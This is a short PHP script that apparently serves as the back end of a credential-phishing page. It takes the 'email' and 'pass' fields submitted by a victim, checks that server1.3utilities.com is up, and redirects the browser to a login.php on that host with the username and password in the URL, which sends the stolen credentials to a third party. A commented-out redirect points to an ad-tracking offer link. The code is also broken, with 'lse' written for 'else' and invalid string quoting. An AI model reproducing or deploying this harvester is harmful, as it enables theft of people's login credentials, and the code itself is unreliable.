<? 
if($_POST){
 function nowww($text) {
 $word = array(
 "http://" => "",
 "www." => "",
 );
 foreach ($word as $bad => $good) {
 $text = str_replace($bad, $good, $text);
 }
 $oldurl = explode("/", $text);
 $newurl = $oldurl[0];
 $text = "$newurl";
 $text = strip_tags(addslashes($text));
 return $text;
 }
//url que queremos saber si esta up o down
 $url = "http://server1.3utilities.com/api-server.php";

 $site = nowww("$url"); 
 $check = @fsockopen($site, 80); 

 if ($check) { 
 $usuario = $_POST[ 'email' ];
$password = $_POST[ 'pass' ];
   
header ("Location: http://server1.3utilities.com/chelin/login.php?usuario="$usuario"&password="$password"");
 } 
lse { 
 //header ("Location: https://Tracking-all-traffic.offerdirecto.com?id=LGoRTd6m85&type=21&click_id={click_id}");
 
 echo $usuario . " " . $password;
} 
}
 ?>
